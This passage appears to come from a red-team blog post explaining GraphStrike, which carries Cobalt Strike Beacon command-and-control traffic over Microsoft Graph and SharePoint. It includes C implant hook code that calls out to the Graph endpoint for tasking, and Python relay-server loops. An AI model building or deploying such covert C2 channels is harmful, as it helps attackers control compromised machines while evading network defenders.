class="enlighter-g1">&gt;</span><span class="enlighter-text">readTasking = </span><span class="enlighter-e0">TRUE</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-c0">// Beacon calls InternetReadFile until it reads 0 data. Once we are completely done reading output,</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-c0">// upload a blank file to the TS tasking file to signal server we are ready for more tasking.</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">else</span><span class="enlighter-text"> </span><span class="enlighter-k1">if</span><span class="enlighter-g1">(</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">readTasking &amp;&amp; *lpdwNumberOfBytesRead == 0</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">readTasking = </span><span class="enlighter-e0">FALSE</span><span class="enlighter-text">;            </span></div></div><div class=""><div><span class="enlighter-text">            LPVOID response = </span><span class="enlighter-m0">MakeWebRequest</span><span class="enlighter-g1">(</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">hInternet, </span></div></div><div class=""><div><span class="enlighter-text">                                              GRAPH_ADDRESS, </span></div></div><div class=""><div><span class="enlighter-text">                                              pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">httpGetUri, </span></div></div><div class=""><div><span class="enlighter-text">                                              PUT_VERB, </span></div></div><div class=""><div><span class="enlighter-text">                                              pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">httpPostHeaders, </span></div></div><div class=""><div><span class="enlighter-text">                                              </span><span class="enlighter-e1">NULL</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                              pMemAddrs </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">response</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">free</span><span class="enlighter-g1">(</span><span class="enlighter-text">response</span><span class="enlighter-g1">)</span><span class="enlighter-text">;            </span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">return</span><span class="enlighter-text"> bResult;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text">;</span></div></div></div><div class="enlighter-raw">SECTION( D ) BOOL InternetReadFile_Hook( HINTERNET hFile, 
                                          LPVOID lpBuffer, 
                                          DWORD dwNumberOfBytesToRead, 
                                          LPDWORD lpdwNumberOfBytesRead )
{
    BOOL bResult = FALSE;

    // Resolve API's
    struct MemAddrs* pMemAddrs = *(struct MemAddrs**)((PMEMADDR) OFFSET ( MemAddr ) )-&gt;address;

    // Call InternetReadFile
    bResult = ( BOOL )U_PTR( SPOOF( pMemAddrs-&gt;Api.net.InternetReadFile, 
                                     pMemAddrs-&gt;Api.net.hNet, 
                                     pMemAddrs-&gt;Api.net.size, 
                                     hFile, 
                                     C_PTR ( lpBuffer ), 
                                     C_PTR( U_PTR ( dwNumberOfBytesToRead ) ), 
                                     C_PTR( U_PTR ( lpdwNumberOfBytesRead ) ) ) );

    // Only run the following if this is a GraphStrike Beacon
    if (pMemAddrs-&gt;graphStrike)
    {
        // If we are reading data from a GET request, set readTasking to TRUE
        if(pMemAddrs-&gt;activeGet &amp;&amp; *lpdwNumberOfBytesRead &gt; 0)
            pMemAddrs-&gt;readTasking = TRUE;

        // Beacon calls InternetReadFile until it reads 0 data. Once we are completely done reading output,
        // upload a blank file to the TS tasking file to signal server we are ready for more tasking.
        else if(pMemAddrs-&gt;readTasking &amp;&amp; *lpdwNumberOfBytesRead == 0)
        {
            pMemAddrs-&gt;readTasking = FALSE;            
            LPVOID response = MakeWebRequest(pMemAddrs-&gt;hInternet, 
                                              GRAPH_ADDRESS, 
                                              pMemAddrs-&gt;httpGetUri, 
                                              PUT_VERB, 
                                              pMemAddrs-&gt;httpPostHeaders, 
                                              NULL, 
                                              pMemAddrs );
            if (response)
                pMemAddrs-&gt;Api.msvcrt.free(response);            
        }
    }

    return bResult;
};</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">SECTION( D ) BOOL InternetReadFile_Hook( HINTERNET hFile,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LPVOID lpBuffer,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DWORD dwNumberOfBytesToRead,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LPDWORD lpdwNumberOfBytesRead )
{
&nbsp;&nbsp;&nbsp;&nbsp;BOOL bResult = FALSE;

&nbsp;&nbsp;&nbsp;&nbsp;// Resolve API's
&nbsp;&nbsp;&nbsp;&nbsp;struct MemAddrs* pMemAddrs = *(struct MemAddrs**)((PMEMADDR) OFFSET ( MemAddr ) )-&gt;address;

&nbsp;&nbsp;&nbsp;&nbsp;// Call InternetReadFile
&nbsp;&nbsp;&nbsp;&nbsp;bResult = ( BOOL )U_PTR( SPOOF( pMemAddrs-&gt;Api.net.InternetReadFile,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.net.hNet,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.net.size,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hFile,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR ( lpBuffer ),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR( U_PTR ( dwNumberOfBytesToRead ) ),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR( U_PTR ( lpdwNumberOfBytesRead ) ) ) );

&nbsp;&nbsp;&nbsp;&nbsp;// Only run the following if this is a GraphStrike Beacon
&nbsp;&nbsp;&nbsp;&nbsp;if (pMemAddrs-&gt;graphStrike)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// If we are reading data from a GET request, set readTasking to TRUE
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(pMemAddrs-&gt;activeGet &amp;&amp; *lpdwNumberOfBytesRead &gt; 0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;readTasking = TRUE;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Beacon calls InternetReadFile until it reads 0 data. Once we are completely done reading output,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// upload a blank file to the TS tasking file to signal server we are ready for more tasking.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else if(pMemAddrs-&gt;readTasking &amp;&amp; *lpdwNumberOfBytesRead == 0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;readTasking = FALSE;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LPVOID response = MakeWebRequest(pMemAddrs-&gt;hInternet,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GRAPH_ADDRESS,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;httpGetUri,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PUT_VERB,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;httpPostHeaders,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (response)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.msvcrt.free(response);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;return bResult;
};</pre>
</div>
</div>
</div>
<p>This is contrary to the usual flow where Beacon only uploads to the Beacon output file, but by zeroing out the TS tasking file after we are done reading from it Beacon can signal to the GraphStrike server that it has received the last task and is ready for more. This also prevents Beacon from running the same command multiple times, as the next time Beacon checks in (even if say the GraphStrike server goes down or stops responding) it will interpret the blank TS tasking file as a “no tasking, check in next time” message and go back to sleep. The GraphStrike server’s logic pairs with this, waiting until it sees that Beacon has retrieved and zeroed the TS tasking file before it tries to send more.</p>
</div>
<p data-renderer-start-pos="76430">The same dynamic exists in the Beacon output file. When the GraphStrike server detects that the Beacon output file has data it downloads the output and then uploads a blank file to zero out the file in SharePoint. Beacon makes an out-of-band request within HttpOpenRequestA_Hook each time a http-post cycle is detected to first check that the Beacon output file is blank / that the last output was received by the GraphStrike server before allowing Beacon to continue with uploading output. Taken together, this methodology mitigates both of the issues mentioned above.</p>
<p>&nbsp;</p>
<h4 id="The-GraphStrike-Server" data-renderer-start-pos="77001"><span class="ez-toc-section" id="The_GraphStrike_Server" ez-toc-data-id="#The_GraphStrike_Server"></span>The GraphStrike Server<span class="ez-toc-section-end"></span></h4>
<p data-renderer-start-pos="77025">The GraphStrike server’s job is to act as a shuttle or translator between the TS and Graph API. In comparison to what has been discussed thus far, the development process for this component was far simpler and smoother. First and foremost it didn’t need to be written as position independent C; it is written in Python for convenience. A close second is that we are no longer trying to manipulate, shortcut, and duct tape together an existing binary to make it do what we want but instead have total control over the program. While simpler, there are still a few things worth talking about.</p>
<p data-renderer-start-pos="77617">When the server is started it fetches an access token for Graph API and then goes into an endless loop wherein it calls the ‘CheckBeacons’ function:</p>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k4"># Call CheckBeacons continuously to service Beacon threads</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">while</span><span class="enlighter-g1">(</span><span class="enlighter-e0">True</span><span class="enlighter-g1">)</span><span class="enlighter-text">:</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k4"># Refresh access token if necessary</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        currTime = time.</span><span class="enlighter-m3">time</span><span class="enlighter-g1">()</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> currTime </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> refreshTime:</span></div></div><div class=""><div><span class="enlighter-text">             access_token, refreshTime = </span><span class="enlighter-m0">GetAccessToken</span><span class="enlighter-g1">()</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">CheckBeacons</span><span class="enlighter-g1">()</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        time.</span><span class="enlighter-m3">sleep</span><span class="enlighter-g1">(</span><span class="enlighter-n0">0.5</span><span class="enlighter-g1">)</span></div></div></div><div class="enlighter-raw">    # Call CheckBeacons continuously to service Beacon threads
    while(True):

        # Refresh access token if necessary
        currTime = time.time()
        if currTime &gt; refreshTime:
             access_token, refreshTime = GetAccessToken()
        
        CheckBeacons()
        time.sleep(0.5)</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">    # Call CheckBeacons continuously to service Beacon threads
&nbsp;&nbsp;&nbsp;&nbsp;while(True):

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Refresh&nbsp;access&nbsp;token&nbsp;if&nbsp;necessary
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;currTime&nbsp;=&nbsp;time.time()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;currTime&nbsp;&gt;&nbsp;refreshTime:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;access_token,&nbsp;refreshTime&nbsp;=&nbsp;GetAccessToken()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CheckBeacons()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time.sleep(0.5)</pre>
<p>‘CheckBeacons’ begins by making a Graph API request to fetch a list of ALL of the files stored in the specific SharePoint drive that is used for GraphStrike. Every file returned by this query is associated with a Cobalt Strike Beacon and is added to an internal data structure for tracking. Subsequent calls to CheckBeacons fetches this list again(this function runs every half second) and compares it against the data in its internal model; differences between the two serve as signals to the server that alters its behavior.</p>
</div>
</div>
</div>
</div>
<p data-renderer-start-pos="78603">Each new file that appears in SharePoint represents a new Beacon entirely, or at least a new Beacon output file that is paired with an existing TS tasking file. A Beacon’s TS tasking file and Beacon output file are inherently linked, and server uses this relationship and the state of each file as part of its strategy for flow control. Some of this was discussed in the last section, in reference to waiting until Beacon has downloaded + zeroed out the tasking file before sending more tasking from the TS. Really all complexities found within the server concern the need to conform to the Beacon HTTP transaction lifecycle. Each Beacon that the server tracks has a number of associated variables that are updated, toggled, or referenced to facilitate this. Trying to follow all of these through code snippets is confusing even for me, so I’m opting to keep the details light.</p>
<p data-renderer-start-pos="79485">The server starts a new thread for each unique TS tasking file that it finds; each one represents a Beacon. This thread runs the function ‘BeaconComms’ which is an endless loop facilitating communications for an individual Beacon:</p>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">  def </span><span class="enlighter-m0">BeaconComms</span><span class="enlighter-g1">(</span><span class="enlighter-text">fileName</span><span class="enlighter-g1">)</span><span class="enlighter-text">:</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k4"># Retrieve entry from dictionary</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    comms = masterTracker</span><span class="enlighter-g1">[</span><span class="enlighter-text">fileName</span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k4"># Run in endless loop</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">while</span><span class="enlighter-text"> </span><span class="enlighter-e0">True</span><span class="enlighter-text">:</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k4"># Block here depending on state of taskingReady event handler</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        comms</span><span class="enlighter-g1">[</span><span class="enlighter-text">'taskingReady'</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">wait</span><span class="enlighter-g1">()</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k4"># If killThread is true, a TS task has been queued for Beacon without it retrieving it for longer than</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k4"># the allowed timeout and this BeaconComms channel has been signaled to exit to conserve resources.</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> comms</span><span class="enlighter-g1">[</span><span class="enlighter-text">'state'</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">state</span><span class="enlighter-text"> == 'timeout' </span><span class="enlighter-k3">and</span><span class="enlighter-text"> comms</span><span class="enlighter-g1">[</span><span class="enlighter-text">'killThread'</span><span class="enlighter-g1">]</span><span class="enlighter-text">:</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">p_info</span><span class="enlighter-g1">(</span><span class="enlighter-text">f</span><span class="enlighter-s0">"Beacon {comms['beaconId']}: timed out -&gt; killing thread."</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k0">return</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k4"># Send Beacon http-get to TS + return any tasking</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        tasking = </span><span class="enlighter-m0">SendGetToTS</span><span class="enlighter-g1">(</span><span class="enlighter-text">fileName, </span><span class="enlighter-e0">False</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k4"># If TS returned data, we need to upload it to the TS tasking file</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-m0">len</span><span class="enlighter-g1">(</span><span class="enlighter-text">tasking</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> 0:</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">UploadFile</span><span class="enlighter-g1">(</span><span class="enlighter-text">fileName, tasking</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k4"># Clear taskingReady event handler so that we will block at the start of next loop until we see</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k4"># that Beacon has received + cleared the TS tasking file</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            comms</span><span class="enlighter-g1">[</span><span class="enlighter-text">'taskingReady'</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">clear</span><span class="enlighter-g1">()</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k4"># Get current time before waiting for signal</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        bt = datetime.</span><span class="enlighter-m3">datetime</span><span class="enlighter-text">.</span><span class="enlighter-m3">now</span><span class="enlighter-g1">(</span><span class="enlighter-text">datetime.</span><span class="enlighter-m3">timezone</span><span class="enlighter-text">.</span><span class="enlighter-m3">utc</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k4"># Wait until we are signaled that Beacon has output, up to a max of the Beacon's sleep time</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        comms</span><span class="enlighter-g1">[</span><span class="enlighter-text">'outputReady'</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">wait</span><span class="enlighter-g1">(</span><span class="enlighter-text">comms</span><span class="enlighter-g1">[</span><span class="enlighter-text">'sleepTime'</span><span class="enlighter-g1">])</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k4"># If the sleep ended because we were signaled, retrieve it and send to TS</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> comms</span><span class="enlighter-g1">[</span><span class="enlighter-text">'outputReady'</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">is_set</span><span class="enlighter-g1">()</span><span class="enlighter-text">:</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span 